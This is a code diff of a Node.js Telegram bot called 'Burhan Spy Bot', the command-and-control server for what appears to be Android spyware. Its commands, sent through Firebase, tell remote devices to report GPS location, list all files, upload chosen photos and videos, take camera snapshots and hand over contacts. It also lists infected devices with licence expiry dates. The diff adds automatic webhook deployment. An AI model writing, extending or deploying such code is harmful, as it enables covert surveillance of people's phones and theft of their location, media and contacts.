@@ -2,15 +2,16 @@ const TelegramBot = require('node-telegram-bot-api');
 const admin = require('firebase-admin');
 const express = require('express');
 
-// Environment variables
-const token = process.env.TOKEN;
-const YOUR_USER_ID = process.env.USER_ID; // String, e.g., "2062068620"
+// ===== CONFIGURATION (from env) =====
+const token = process.env.TOKEN;               // Telegram bot token
+const YOUR_USER_ID = process.env.USER_ID;      // Your Telegram ID (string)
 
-const bot = new TelegramBot(token, { polling: false }); // Webhook mode
+// ===== INITIALIZE =====
+const bot = new TelegramBot(token, { polling: false });
 const app = express();
 app.use(express.json());
 
-// Firebase Setup (using service account file)
+// Firebase Admin
 const serviceAccount = require('./firebase-service-account.json');
 admin.initializeApp({
     credential: admin.credential.cert(serviceAccount),
@@ -18,196 +19,199 @@ admin.initializeApp({
 });
 const db = admin.database();
 
-// Global flag to cancel ongoing operations
+// Global flag to track current operation (cancellation)
 let currentOperation = null;
 
-// Helper: Authorization check
+// ===== AUTHORIZATION =====
 function isAuthorized(msg) {
     return String(msg.from.id) === String(YOUR_USER_ID);
 }
 
-// Helper: Send error message
-function sendError(chatId, msg) {
-    bot.sendMessage(chatId, `❌ ${msg}`);
-}
+// ===== WEBHOOK SETUP (auto on boot) =====
+const PORT = process.env.PORT || 3000;
+const WEBHOOK_URL = process.env.RAILWAY_PUBLIC_DOMAIN 
+    ? `https://${process.env.RAILWAY_PUBLIC_DOMAIN}/webhook` 
+    : null;
 
-// Webhook endpoint
 app.post('/webhook', (req, res) => {
     bot.processUpdate(req.body);
     res.sendStatus(200);
 });
 
-// ========== COMMANDS ==========
+app.listen(PORT, async () => {
+    console.log(`🚀 Server running on port ${PORT}`);
+    if (WEBHOOK_URL) {
+        try {
+            await bot.setWebHook(WEBHOOK_URL);
+            console.log(`✅ Webhook set to ${WEBHOOK_URL}`);
+        } catch (e) {
+            console.error('❌ Webhook failed:', e.message);
+        }
+    } else {
+        console.warn('⚠️ RAILWAY_PUBLIC_DOMAIN not set. Manual webhook needed.');
+    }
+});
 
-// /start - resume bot (just message)
+// ===== COMMANDS =====
+
+// /start - resume bot
 bot.onText(/\/start/, (msg) => {
     const chatId = msg.chat.id;
     if (!isAuthorized(msg)) return bot.sendMessage(chatId, "⛔ Access Denied!");
-    bot.sendMessage(chatId, "🔥 Burhan Spy Bot is active. Use /help for commands.");
+    currentOperation = null; // cancel any operation
+    bot.sendMessage(chatId, "🔥 Burhan Spy Bot active. Use /help.");
 });
 
-// /stop - stop bot (simulate by disabling operations)
+// /stop - cancel everything
 bot.onText(/\/stop/, (msg) => {
     const chatId = msg.chat.id;
     if (!isAuthorized(msg)) return bot.sendMessage(chatId, "⛔ Access Denied!");
-    currentOperation = null; // cancel any ongoing operation
-    bot.sendMessage(chatId, "🛑 Bot stopped. Use /start to resume.");
+    currentOperation = null;
+    bot.sendMessage(chatId, "🛑 All operations cancelled. Use /start to resume.");
 });
 
 // /help - full command list
 bot.onText(/\/help/, (msg) => {
     const chatId = msg.chat.id;
     if (!isAuthorized(msg)) return bot.sendMessage(chatId, "⛔ Access Denied!");
-    bot.sendMessage(chatId, `📜 **COMMANDS LIST**\n\n` +
-        `/locate <ID> - Get live GPS and device info\n` +
-        `/devices - List all devices with key & expiry\n` +
-        `/files <ID> - List ALL file names\n` +
-        `/getphoto <ID> <FILE> - Request a photo\n` +
-        `/getvideo <ID> <FILE> - Request a video\n` +
-        `/camera <ID> [front|back] - Capture snapshot\n` +
-        `/ping <ID> - Check if device is alive\n` +
+    bot.sendMessage(chatId, 
+        `📜 **COMMANDS**\n` +
+        `/locate <ID> - GPS + device info\n` +
+        `/devices - All devices with key/expiry\n` +
+        `/files <ID> - List all files\n` +
+        `/getphoto <ID> <FILE> - Get photo\n` +
+        `/getvideo <ID> <FILE> - Get video\n` +
+        `/camera <ID> [front|back] - Snapshot\n` +
+        `/ping <ID> - Check alive\n` +
         `/stats - Total device count\n` +
-        `/contacts <ID> - Fetch all contacts\n` +
-        `/stop - Stop the bot\n` +
-        `/start - Resume bot\n\n` +
-        `⚠️ Any new command cancels ongoing operations.`);
+        `/contacts <ID> - Fetch contacts\n` +
+        `/stop - Cancel + stop\n` +
+        `/start - Resume\n\n` +
+        `⚠️ New command cancels previous operation.`
+    );
 });
 
-// /devices - list all devices
+// /devices
 bot.onText(/\/devices/, (msg) => {
     const chatId = msg.chat.id;
     if (!isAuthorized(msg)) return bot.sendMessage(chatId, "⛔ Access Denied!");
     currentOperation = 'devices';
-    db.ref('devices').once('value', (snapshot) => {
-        const devices = snapshot.val() || {};
-        let message = `📱 ALL DEVICES (Total: ${Object.keys(devices).length})\n\n`;
+    db.ref('devices').once('value').then(snap => {
+        const devices = snap.val() || {};
+        let text = `📱 ALL DEVICES (Total: ${Object.keys(devices).length})\n\n`;
         Object.entries(devices).forEach(([id, d]) => {
-            message += `🔑 ID: ${id}\n`;
-            message += `🔑 Key: ${d.deviceName || 'N/A'}\n`;
-            message += `📅 Expiry: ${d.expiry || 'N/A'}\n`;
-            message += `📱 Android: ${d.android || 'N/A'}\n`;
-            message += `📊 Status: ${d.online ? "🟢 ONLINE" : "🔴 OFFLINE"}\n`;
-            message += `🕒 ${d.time || 'N/A'}\n\n`;
+            text += `🔑 ID: ${id}\n`;
+            text += `📅 Expiry: ${d.expiry || 'N/A'}\n`;
+            text += `📊 Status: ${d.online ? "🟢 ONLINE" : "🔴 OFFLINE"}\n`;
+            text += `🕒 ${d.time || 'N/A'}\n\n`;
         });
-        bot.sendMessage(chatId, message);
-    }).catch(err => sendError(chatId, 'Error fetching devices.'));
+        bot.sendMessage(chatId, text);
+    }).catch(err => bot.sendMessage(chatId, "❌ Error fetching devices."));
 });
 
-// /stats - total devices
+// /stats
 bot.onText(/\/stats/, (msg) => {
     const chatId = msg.chat.id;
     if (!isAuthorized(msg)) return bot.sendMessage(chatId, "⛔ Access Denied!");
     currentOperation = 'stats';
-    db.ref('devices').once('value', (snapshot) => {
-        const devices = snapshot.val() || {};
-        bot.sendMessage(chatId, `📊 Total Devices: ${Object.keys(devices).length}`);
-    }).catch(err => sendError(chatId, 'Error fetching stats.'));
+    db.ref('devices').once('value').then(snap => {
+        bot.sendMessage(chatId, `📊 Total Devices: ${Object.keys(snap.val() || {}).length}`);
+    }).catch(err => bot.sendMessage(chatId, "❌ Error."));
 });
 
-// /locate <ID> - GPS and device info
+// /locate <ID>
 bot.onText(/\/locate (.+)/, (msg, match) => {
     const chatId = msg.chat.id;
     if (!isAuthorized(msg)) return bot.sendMessage(chatId, "⛔ Access Denied!");
     const deviceId = match[1].trim();
     currentOperation = 'locate';
-    // Send command to device (store in commands ref)
-    db.ref('commands').child(deviceId).set('locate')
-        .then(() => {
-            bot.sendMessage(chatId, `📍 Locate command sent for device ${deviceId}. Waiting for response...`);
-            // In real logic, you'd listen to a 'responses' node for GPS data. We'll just send a placeholder.
-            // But for full functionality, you'd have a listener that reads the device's reply and forwards it.
-            // To keep it simple, we'll just fetch from 'devices' node if it has location info.
-            db.ref('devices').child(deviceId).once('value', (snap) => {
-                const dev = snap.val() || {};
-                if (dev.location) {
-                    bot.sendMessage(chatId, `📍 **Location for ${deviceId}:**\nLat: ${dev.location.lat}\nLng: ${dev.location.lng}\nLast updated: ${dev.location.time || 'N/A'}`);
-                } else {
-                    bot.sendMessage(chatId, `⏳ Device ${deviceId} has not reported location yet.`);
-                }
-            });
-        })
-        .catch(err => sendError(chatId, 'Failed to send locate command.'));
+    db.ref('commands').child(deviceId).set('locate').then(() => {
+        bot.sendMessage(chatId, `📍 Locate sent to ${deviceId}. Waiting...`);
+        // Fetch existing location if stored
+        db.ref('devices').child(deviceId).once('value').then(snap => {
+            const dev = snap.val() || {};
+            if (dev.location) {
+                bot.sendMessage(chatId, `📍 **Location for ${deviceId}:**\nLat: ${dev.location.lat}\nLng: ${dev.location.lng}\nTime: ${dev.location.time || 'N/A'}`);
+            } else {
+                bot.sendMessage(chatId, `⏳ Device hasn't reported location yet.`);
+            }
+        });
+    }).catch(err => bot.sendMessage(chatId, "❌ Failed."));
 });
 
-// /files <ID> - list all file names
+// /files <ID>
 bot.onText(/\/files (.+)/, (msg, match) => {
     const chatId = msg.chat.id;
     if (!isAuthorized(msg)) return bot.sendMessage(chatId, "⛔ Access Denied!");
     const deviceId = match[1].trim();
     currentOperation = 'files';
-    db.ref('commands').child(deviceId).set('list_files')
-        .then(() => bot.sendMessage(chatId, `📂 File list request sent for device ${deviceId}...`))
-        .catch(err => sendError(chatId, 'Failed to send files command.'));
+    db.ref('commands').child(deviceId).set('list_files').then(() => {
+        bot.sendMessage(chatId, `📂 File list request sent for ${deviceId}.`);
+    }).catch(err => bot.sendMessage(chatId, "❌ Failed."));
 });
 
-// /getphoto <ID> <FILE> - request photo
+// /getphoto <ID> <FILE>
 bot.onText(/\/getphoto (.+) (.+)/, (msg, match) => {
     const chatId = msg.chat.id;
     if (!isAuthorized(msg)) return bot.sendMessage(chatId, "⛔ Access Denied!");
     const deviceId = match[1].trim();
     const fileName = match[2].trim();
     currentOperation = 'getphoto';
-    db.ref('commands').child(deviceId).set({ type: 'get_photo', file: fileName })
-        .then(() => bot.sendMessage(chatId, `📸 Photo request sent for ${deviceId} file: ${fileName}`))
-        .catch(err => sendError(chatId, 'Failed to send photo command.'));
+    db.ref('commands').child(deviceId).set({ type: 'get_photo', file: fileName }).then(() => {
+        bot.sendMessage(chatId, `📸 Photo request for ${deviceId} / ${fileName} sent.`);
+    }).catch(err => bot.sendMessage(chatId, "❌ Failed."));
 });
 
-// /getvideo <ID> <FILE> - request video
+// /getvideo <ID> <FILE>
 bot.onText(/\/getvideo (.+) (.+)/, (msg, match) => {
     const chatId = msg.chat.id;
     if (!isAuthorized(msg)) return bot.sendMessage(chatId, "⛔ Access Denied!");
     const deviceId = match[1].trim();
     const fileName = match[2].trim();
     currentOperation = 'getvideo';
-    db.ref('commands').child(deviceId).set({ type: 'get_video', file: fileName })
-        .then(() => bot.sendMessage(chatId, `📹 Video request sent for ${deviceId} file: ${fileName}`))
-        .catch(err => sendError(chatId, 'Failed to send video command.'));
+    db.ref('commands').child(deviceId).set({ type: 'get_video', file: fileName }).then(() => {
+        bot.sendMessage(chatId, `📹 Video request for ${deviceId} / ${fileName} sent.`);
+    }).catch(err => bot.sendMessage(chatId, "❌ Failed."));
 });
 
-// /camera <ID> [front|back] - capture snapshot
-bot.onText(/\/camera (.+) (front|back)?/, (msg, match) => {
+// /camera <ID> [front|back]
+bot.onText(/\/camera (.+) (front|back)?/i, (msg, match) => {
     const chatId = msg.chat.id;
     if (!isAuthorized(msg)) return bot.sendMessage(chatId, "⛔ Access Denied!");
     const deviceId = match[1].trim();
     const camera = (match[2] || 'back').toLowerCase();
     currentOperation = 'camera';
-    db.ref('commands').child(deviceId).set({ type: 'camera', camera: camera })
-        .then(() => bot.sendMessage(chatId, `📷 Camera request sent for ${deviceId} using ${camera} camera.`))
-        .catch(err => sendError(chatId, 'Failed to send camera command.'));
+    db.ref('commands').child(deviceId).set({ type: 'camera', camera: camera }).then(() => {
+        bot.sendMessage(chatId, `📷 Snapshot request for ${deviceId} (${camera} cam) sent.`);
+    }).catch(err => bot.sendMessage(chatId, "❌ Failed."));
 });
 
-// /ping <ID> - check if device alive
+// /ping <ID>
 bot.onText(/\/ping (.+)/, (msg, match) => {
     const chatId = msg.chat.id;
     if (!isAuthorized(msg)) return bot.sendMessage(chatId, "⛔ Access Denied!");
     const deviceId = match[1].trim();
     currentOperation = 'ping';
-    db.ref('commands').child(deviceId).set('ping')
-        .then(() => bot.sendMessage(chatId, `📡 Ping sent to device ${deviceId}. Waiting for response...`))
-        .catch(err => sendError(chatId, 'Failed to send ping.'));
+    db.ref('commands').child(deviceId).set('ping').then(() => {
+        bot.sendMessage(chatId, `📡 Ping sent to ${deviceId}.`);
+    }).catch(err => bot.sendMessage(chatId, "❌ Failed."));
 });
 
-// /contacts <ID> - fetch contacts
+// /contacts <ID>
 bot.onText(/\/contacts (.+)/, (msg, match) => {
     const chatId = msg.chat.id;
     if (!isAuthorized(msg)) return bot.sendMessage(chatId, "⛔ Access Denied!");
     const deviceId = match[1].trim();
     currentOperation = 'contacts';
-    db.ref('commands').child(deviceId).set('get_contacts')
-        .then(() => bot.sendMessage(chatId, `📞 Contacts request sent for device ${deviceId}...`))
-        .catch(err => sendError(chatId, 'Failed to send contacts command.'));
+    db.ref('commands').child(deviceId).set('get_contacts').then(() => {
+        bot.sendMessage(chatId, `📞 Contacts request sent for ${deviceId}.`);
+    }).catch(err => bot.sendMessage(chatId, "❌ Failed."));
 });
 
-// ========== CANCELLATION LOGIC ==========
-// When any new command is received, it sets 'currentOperation' which effectively cancels the previous one.
-// If you want to actually abort a long-running process (like waiting for a response), you would need to clear a timer or listener.
-// This implementation simply overwrites the command sent to the device, which means the device will ignore the old one if it hasn't acted yet.
-
-// ========== SERVER START ==========
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-    console.log(`Server running on port ${PORT}`);
-    // Optionally set webhook automatically if you know the URL
-    // const webhookUrl = `https://your-app.railway.app/webhook`;
-    // bot.setWebHook(webhookUrl).then(() => console.log("Webhook set"));
+// ===== UNHANDLED MESSAGES =====
+bot.on('message', (msg) => {
+    // If message doesn't match any command, just ignore
+    // But we can log it
+    if (!isAuthorized(msg)) return;
+    // No action
 });
